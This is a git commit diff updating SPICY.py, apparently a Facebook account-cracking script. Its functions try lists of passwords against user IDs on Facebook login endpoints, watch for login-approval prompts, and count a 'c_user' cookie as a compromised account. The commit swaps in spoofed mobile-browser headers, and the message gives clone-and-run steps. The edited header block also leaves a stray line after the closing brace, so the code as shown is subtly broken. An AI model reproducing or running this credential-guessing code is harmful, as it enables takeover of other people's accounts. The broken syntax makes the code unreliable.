36b768adcb141915ea36a883e4daabe8f421ffa9
muzimasoom <129160250+muzimasoom@users.noreply.github.com>
2023-11-15 09:20:39 +0500

    Update SPICY.py
    rm -rf SPICY
    git clone https://github.com/muzimasoom/SPICY/
    cd SPICY
    python SPICY.py

--- SPICY.py
+++ SPICY.py
@@ -1130,8 +1130,7 @@ def trt1(ids,passlist):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',}
+    'user-agent': ua}
                         url = 'https://b-graph.facebook.com/auth/login'
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
@@ -1547,25 +1546,27 @@ def trt6(ids,passlist):
                         "email":uid,
                         "pass":ps,
                         "login":"Log In"}
-                        header_freefb = {'authority':'p.facebook.com',
-                        'upgrade-insecure-requests': '1',
-                        'viewport-width': '980',
-                        'method': 'path',
-                        'scheme': 'https',
-                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
-                        'dnt':'1', 
-                        'x-requested-with':'mark.via.gp', 
-                        'sec-fetch-site': 'none',
-                        'sec-fetch-mode': 'navigate',
-                        'sec-fetch-user': '?1',
-                        'sec-fetch-dest': 'document',
-                        'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
-                        'cache-control': 'max-age=0',
-                        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
-                        'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
-                        "sec-ch-prefers-color-scheme": "light",
-                        'user-agent': ua}
+                        header_freefb = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'method': 'path',   
+    'scheme': 'https',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '2',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"TECNO LD7"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': ua}
+    'viewport-width': '980',}
                         lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
                         log_cookies=session.cookies.get_dict().keys()
                         if 'c_user' in log_cookies:
